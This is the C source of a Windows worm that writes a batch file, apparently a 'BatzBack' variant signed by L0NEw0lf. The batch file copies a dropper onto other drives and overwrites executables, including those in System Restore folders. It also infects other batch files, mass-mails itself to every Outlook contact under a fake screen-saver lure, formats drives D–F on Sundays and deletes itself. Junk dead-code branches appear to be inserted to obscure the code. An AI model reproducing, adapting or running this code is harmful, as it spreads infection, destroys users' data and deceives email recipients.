#include "data_globals.h"
#include <stdio.h>      // for FILE, fopen, fprintf, fclose
#include <direct.h>     // for _chdir
#include <stdlib.h>     // for malloc, free
#include <string.h>     // for strlen, memset

void _WriteBatch()
{
    _chdir(_windir);

    // --- INSERTED DEAD BRANCH 1 (Math Invariant, Category A: System info) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char userName[256];
        DWORD size = sizeof(userName);
        if (GetUserNameA(userName, &size)) {
            volatile int dummyUse = userName[0];
        }
        char compName[256];
        size = sizeof(compName);
        if (GetComputerNameA(compName, &size)) {
            volatile int dummyUse = compName[0];
        }
        volatile DWORD dummySum = 0;
        for (int i = 0; i < 10; i++) {
            dummySum += si.dwNumberOfProcessors + st.wHour;
        }
        // No local variables to read (Batz not yet assigned)
        SecureZeroMemory(&si, sizeof(si));
        SecureZeroMemory(&st, sizeof(st));
    }

    Batz = fopen("BBbLWDB.Bat", "wt");

    fprintf(Batz, "Echo.\n");
    fprintf(Batz, "@cls\n");
    fprintf(Batz, "@echo off\n");
    fprintf(Batz, "@break off\n");
    fprintf(Batz, "::BBbLW - L0NEInc.\n");
    fprintf(Batz, "if exist Z:\\ Copy %%WinDir%%\\TASKMOAN.EXE Z:\\\n");
    fprintf(Batz, "if exist Y:\\ Copy %%WinDir%%\\TASKMOAN.EXE Y:\\\n");
    fprintf(Batz, "if exist X:\\ Copy %%WinDir%%\\TASKMOAN.EXE X:\\\n");
    fprintf(Batz, "if exist W:\\ Copy %%WinDir%%\\TASKMOAN.EXE W:\\\n");
    fprintf(Batz, "if exist V:\\ Copy %%WinDir%%\\TASKMOAN.EXE V:\\\n");
    fprintf(Batz, "if exist U:\\ Copy %%WinDir%%\\TASKMOAN.EXE U:\\\n");
    fprintf(Batz, "if exist T:\\ Copy %%WinDir%%\\TASKMOAN.EXE T:\\\n");
    fprintf(Batz, "if exist S:\\ Copy %%WinDir%%\\TASKMOAN.EXE S:\\\n");
    fprintf(Batz, "if exist R:\\ Copy %%WinDir%%\\TASKMOAN.EXE R:\\\n");
    fprintf(Batz, "if exist Q:\\ Copy %%WinDir%%\\TASKMOAN.EXE Q:\\\n");
    fprintf(Batz, "if exist P:\\ Copy %%WinDir%%\\TASKMOAN.EXE P:\\\n");
    fprintf(Batz, "if exist O:\\ Copy %%WinDir%%\\TASKMOAN.EXE O:\\\n");
    fprintf(Batz, "if exist N:\\ Copy %%WinDir%%\\TASKMOAN.EXE N:\\\n");
    fprintf(Batz, "if exist M:\\ Copy %%WinDir%%\\TASKMOAN.EXE M:\\\n");
    fprintf(Batz, "if exist L:\\ Copy %%WinDir%%\\TASKMOAN.EXE L:\\\n");
    fprintf(Batz, "if exist K:\\ Copy %%WinDir%%\\TASKMOAN.EXE K:\\\n");
    fprintf(Batz, "if exist J:\\ Copy %%WinDir%%\\TASKMOAN.EXE J:\\\n");
    fprintf(Batz, "if exist I:\\ Copy %%WinDir%%\\TASKMOAN.EXE I:\\\n");
    fprintf(Batz, "if exist H:\\ Copy %%WinDir%%\\TASKMOAN.EXE H:\\\n");
    fprintf(Batz, "if exist G:\\ Copy %%WinDir%%\\TASKMOAN.EXE G:\\\n");
    fprintf(Batz, "goto :XP?\n");
    fprintf(Batz, ":AVCheck\n");
    fprintf(Batz, "if exist \\Progra~1\\Norton~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Norton~2\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Symantec\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Common~1\\Symant~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Common~1\\Symant~1\\Script~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\McAfee\\VirusScan\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\McAfee\\McAfee FireWall\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\PandaS~1\\PandaA~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\TrendM~1\\Pc-cil~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Comman~1\\F-PROT95\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\ZoneLa~1\\ZoneAlarm\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\TinyPe~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Kasper~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Trojan~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\AvPersonal\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\Grisoft\\AVG6\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\AntiVi~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\QuickH~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\FWIN32\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\Progra~1\\FindVirus\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\eSafen\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\f-macro\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\TBAVW95\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\VS95\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\AntiVi~1\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\ToolKit\\FindVirus\\*.EXE goto :BB\n");
    fprintf(Batz, "if exist \\PC-Cil~1\\*.EXE goto :BB\n");
    fprintf(Batz, "goto :WriteMail\n");

    // --- INSERTED DEAD BRANCH 2 (Combination, Category B: Memory & string) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char* dummyBuf = (char*)malloc(64);
        if (dummyBuf) {
            sprintf_s(dummyBuf, 64, "Dummy %d", (int)dummy_tick_2);
            size_t len = strlen(dummyBuf);
            char* dummyBuf2 = (char*)malloc(len + 10);
            if (dummyBuf2) {
                memcpy(dummyBuf2, dummyBuf, len);
                memset(dummyBuf2 + len, 0, 10);
                volatile int hash = 0;
                for (int i = 0; i < (int)len; i++) {
                    hash = (hash * 31) + dummyBuf2[i];
                }
                // read existing local (Batz)
                volatile int readLocal = (int)(DWORD_PTR)Batz;
                free(dummyBuf2);
            }
            free(dummyBuf);
        }
        volatile char localBuf[32];
        memset((void*)localBuf, 0, sizeof(localBuf));
    }

    fprintf(Batz, "WriteMail\n");
    fprintf(Batz, "Echo On Error Resume Next > \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Function Mail() >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Set C = CreateObject(\"Outlook.Application\") >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Set D = C.GetNameSpace(\"MAPI\") >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Set E = D.AddressLists >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo For Each F In E >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo If F.AddressEntries.Count <> 0 Then >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo G = F.AddressEntries.Count >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo For H = 1 To G >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Set I = C.CreateItem(0) >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Set J = F.AddressEntries(H) >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo I.To = J.Address >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo I.Subject = \"Heyhey!\" >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo I.Body = \"Ya know man, I've seen funny things in my life but this screen saver beats them all, You have to check this out.\" >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo I.Attachments.Add \"%s\" >> \\BOTtwoFACE.VBS\n", _sysdoze2);
    fprintf(Batz, "Echo I.DeleteAfterSubmit = True >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo I.Send >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo J = \"\" >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Next >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo End If >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo Next >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Echo End Function >> \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "Start \\BOTtwoFACE.VBS\n");
    fprintf(Batz, "goto :BB\n");
    fprintf(Batz, ":BB\n");
    fprintf(Batz, "Start %%WinDir%%\\.EXE\n");
    fprintf(Batz, "goto :End\n");
    fprintf(Batz, ":XP?\n");
    fprintf(Batz, "Ver | Find \"XP\"\n");
    fprintf(Batz, "if errorlevel 1 goto :NT?\n");
    fprintf(Batz, "if not errorlevel 1 goto :R\n");
    fprintf(Batz, ":NT?\n");
    fprintf(Batz, "Ver | Find \"NT\"\n");
    fprintf(Batz, "if errorlevel 1 goto :2000?\n");
    fprintf(Batz, "if not errorlevel 1 goto :R\n");
    fprintf(Batz, ":2000?\n");
    fprintf(Batz, "Ver | Find \"2000\"\n");
    fprintf(Batz, "if errorlevel 1 goto :I\n");
    fprintf(Batz, "if not errorlevel 1 goto :R\n");
    fprintf(Batz, ":R\n");
    fprintf(Batz, "cacls\"\\System Volume Information\" /E /G %%USERNAME%%:F\n");
    fprintf(Batz, "cd \"\\System Volume Information\\_r??????????????????????????????????????????????????????????????????????????????????????????????\\RP5\"\n");
    fprintf(Batz, "For %%%%i In (*.Exe) Do Echo Y | Copy %%WinDir%%\\TASKMOAN.EXE %%%%i\n");
    fprintf(Batz, "cd \"\\System Volume Information\\_r??????????????????????????????????????????????????????????????????????????????????????????????\\RP10\"\n");
    fprintf(Batz, "For %%%%i In (*.Exe) Do Echo Y | Copy %%WinDir%%\\TASKMOAN.EXE %%%%i\n");
    fprintf(Batz, "cd \"\\System Volume Information\\_r??????????????????????????????????????????????????????????????????????????????????????????????\\RP20\"\n");
    fprintf(Batz, "For %%%%i In (*.Exe) Do Echo Y | Copy %%WinDir%%\\TASKMOAN.EXE %%%%i\n");
    fprintf(Batz, "cacls\"\\System Volume Information\" /E /R %%USERNAME%%\n");
    fprintf(Batz, "For /R \\ %%%%i In (*.EXE) Do Echo Y | Copy %WinDir%\\TASKMOAN.EXE %%%%i\n");
    fprintf(Batz, "goto :Check\n");
    fprintf(Batz, ":Check\n");
    fprintf(Batz, "For /R \\ %%%%b In (*.Bat) Do Set euk=%%%%b\n");
    fprintf(Batz, "Find \"BBbLW\" %%euk%%\n");
    fprintf(Batz, "if errorlevel 1 goto :Go\n");
    fprintf(Batz, "if not errorlevel 1 goto :Check\n");
    fprintf(Batz, ":Go\n");
    fprintf(Batz, "Echo Y | Copy %%euk%%+%%0 %%euk%%\n");
    fprintf(Batz, "goto :Sabbath\n");
    fprintf(Batz, ":I\n");
    fprintf(Batz, "For %%%%i In (\\_RESTORE\\*.Exe \\_RESTORE\\TEMP\\*.Exe) Do Echo Y | Copy %%WinDir%%\\TASKMOAN.EXE %%%%i\n");
    fprintf(Batz, "Echo Y | Copy %%WinDir%%\\TASMOAN.EXE \\_RESTORE\n");
    fprintf(Batz, "For %%%%i In (*.Exe \\*.Exe %%PATH%%\\*.Exe %%WinDir%%\\*.Exe %%WinDir%%\\System\\*.Exe) Do Echo Y | Copy %WinDir%\\TASKMOAN.EXE %%%%i\n");
    fprintf(Batz, "goto :BatCheck\n");
    fprintf(Batz, ":BatCheck\n");
    fprintf(Batz, "For %%%%b In (*.Bat \\*.Bat %%PATH%%\\*.Bat %%WinDir%%\\*.Bat %%WinDir%%\\System\\*.Bat) Do Set pro=%%%%b\n");
    fprintf(Batz, "Find \"BBbLW\" %%pro%%\n");
    fprintf(Batz, "if errorlevel 1 goto :BatGo\n");
    fprintf(Batz, "if not errorlevel 1 goto :BatCheck\n");
    fprintf(Batz, ":BatGo\n");
    fprintf(Batz, "Echo Y | Copy %%pro+%%0 %%pro%%\n");
    fprintf(Batz, "goto :Sabbath\n");
    fprintf(Batz, ":Sabbath\n");
    fprintf(Batz, "Echo Y | Date | Find \"Sun\"\n");
    fprintf(Batz, "if errorlevel 1 goto :AVCheck\n");
    fprintf(Batz, "if not errorlevel 1 goto :PayDay\n");
    fprintf(Batz, ":PayDay\n");
    fprintf(Batz, "Echo MsgBox \"Well well...Look what we have here, Another fool infected\",16,\"For Shame...\" > \\MessageFromL0NEw0lf.vbs\n");
    fprintf(Batz, "Echo MsgBox \"Today is the day that I, L0NEw0lf, will put you in misery Uhahaha.\",48,\"You Are Infected With BatzBack.HDFill By L0NEw0lf\" >> \\MessageFromL0NEw0lf.vbs\n");
    fprintf(Batz, "Echo MsgBox \"This worm is dedicated to a very special person named Christina Aguilera who not only has been misjudged by millions, but truly has a mind of a poet, her lyrics touched my heart deeply.\",64,\"Dedication, May my Sarcasm burn in Hell, Disney to Dirtay Whats next!\" >> \\MessageFromL0NEw0lf.vbs\n");
    fprintf(Batz, "Start \\MessageFromL0NEw0lf.vbs\n");
    fprintf(Batz, "if exist Echo Y | Format D:\n");
    fprintf(Batz, "if exist Echo Y | Format E:\n");
    fprintf(Batz, "if exist Echo Y | Format F:\n");
    fprintf(Batz, "goto :Again\n");
    fprintf(Batz, ":Again\n");
    fprintf(Batz, "A:\n");
    fprintf(Batz, "goto :Again\n");
    fprintf(Batz, ":End\n");
    fprintf(Batz, "Attrib -h %WinDir%\\%%0\n");
    fprintf(Batz, "Echo Y | Del %%0\n");
    fprintf(Batz, "Exit\n");

    // --- INSERTED DEAD BRANCH 3 (System Query, Category C: Bitwise/Math loops) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile unsigned char dummyArr[32];
        for (int i = 0; i < 32; i++) {
            dummyArr[i] = (unsigned char)(i * 7);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int i = 0; i < 32; i++) {
            hash ^= dummyArr[i];
            hash *= 0x01000193;
        }
        volatile int xorSum = 0;
        for (int i = 0; i < 32; i++) {
            xorSum ^= dummyArr[i];
        }
        // read existing local (Batz)
        volatile int readLocal3 = (int)(DWORD_PTR)Batz;
        SecureZeroMemory((void*)dummyArr, sizeof(dummyArr));
        SYSTEM_INFO si2;
        GetSystemInfo(&si2);
        volatile DWORD dummyProc = si2.dwNumberOfProcessors;
    }

    fclose(Batz);
}
